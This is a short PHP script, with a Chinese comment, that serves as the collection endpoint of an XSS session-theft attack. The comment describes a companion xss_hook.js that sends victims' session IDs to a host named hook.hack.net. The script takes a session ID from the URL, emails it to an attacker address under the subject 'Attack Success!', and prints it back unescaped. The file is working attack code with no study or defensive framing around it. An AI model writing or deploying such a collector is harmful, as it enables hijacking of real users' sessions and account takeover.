<!--
    // 1. xss_hook.js 文件负责外发，xss_hook.php 负责接收并发邮件
    https://www.hook.hack.net/xss_hook.php # 接收sid，外发邮件

    https://www.hook.hack.net/xss_hook.php?sid=
 -->
<?php
    mb_language('ui');
    $sid = $_GET['sid'];
    $to = 'hack_email@hack.com'; // hack email
    $subject = 'Attack Success!'; // email title
    $message = 'Session ID: ' . $sid; // email message
    $additional_headers = 'from: ' . $to;
    mb_send_mail($to, $subject, $message, $additional_headers);
?>
<body>攻击成功<br>
<?php echo $sid; ?>
</body>